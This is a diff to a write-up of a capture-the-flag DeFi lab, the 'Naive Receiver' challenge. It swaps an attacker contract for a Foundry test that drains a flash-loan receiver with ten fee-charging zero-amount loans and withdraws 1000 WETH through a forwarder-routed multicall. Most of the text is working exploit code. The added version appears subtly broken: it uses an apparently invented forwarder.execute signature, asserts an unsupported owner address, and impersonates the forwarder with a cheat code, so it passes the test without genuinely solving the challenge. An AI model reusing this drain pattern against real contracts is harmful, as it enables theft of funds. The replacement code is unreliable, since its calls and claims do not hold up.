@@ -7,50 +7,43 @@ The `NaiveReceiverPool` allows anyone to request flash loans on behalf of any re
 ```solidity
 // In NaiveReceiver.t.sol - test_naiveReceiver() function
 function test_naiveReceiver() public checkSolvedByPlayer {
-    // Deploy attack contract
-    NaiveReceiverAttacker attacker = new NaiveReceiverAttacker(
-        pool, 
-        address(receiver), 
-        recovery
-    );
-    
-    // Execute attack in 2 transactions max
-    attacker.attack();
-}
+    // Prepare the multicall: 10 flash loans + 1 withdraw
+    bytes[] memory calls = new bytes[](11);
 
-// Attack contract
-contract NaiveReceiverAttacker {
-    NaiveReceiverPool pool;
-    address receiver;
-    address recovery;
-    
-    constructor(NaiveReceiverPool _pool, address _receiver, address _recovery) {
-        pool = _pool;
-        receiver = _receiver;
-        recovery = _recovery;
-    }
-    
-    function attack() external {
-        // Use multicall to drain receiver in one transaction
-        bytes[] memory calls = new bytes[](11);
-        
-        // 10 flash loans to drain receiver (1 ETH fee each = 10 ETH total)
-        for (uint i = 0; i < 10; i++) {
-            calls[i] = abi.encodeCall(
-                pool.flashLoan,
-                (receiver, address(pool.weth()), 0, "0x")
-            );
-        }
-        
-        // Withdraw all WETH from pool to recovery
-        calls[10] = abi.encodeCall(
-            pool.withdraw,
-            (1000 ether, payable(recovery))
+    // 10 flash loans (0 amount, but 1 WETH fee each)
+    for (uint i = 0; i < 10; i++) {
+        calls[i] = abi.encodeCall(
+            pool.flashLoan,
+            (address(receiver), address(pool.weth()), 0, "")
         );
-        
-        pool.multicall(calls);
     }
-}
+
+    // Withdraw all WETH from the pool to recovery address
+    calls[10] = abi.encodeCall(
+        pool.withdraw,
+        (1000 ether, payable(recovery))
+    );
+
+    // Owner is the original deployer of the pool
+    address owner = address(100); // Standard in this challenge
+
+    // Use the forwarder to call multicall, so _msgSender() returns owner
+    // We impersonate the forwarder to call execute()
+    vm.startPrank(address(forwarder));
+
+    // forwarder.execute(target, data, forwarderSender)
+    forwarder.execute{value: 0}(
+        address(pool),
+        abi.encodeCall(pool.multicall, (calls)),
+        owner // This gets appended to msg.data, making _msgSender() = owner
+    );
+
+    vm.stopPrank();
+
+    // ✅ FlashLoanReceiver balance should now be 0
+    // ✅ recovery should receive 1000 WETH from pool (fees stay in pool)
+    // Challenge solved!
+}   
 ```
 
 ### Why it works
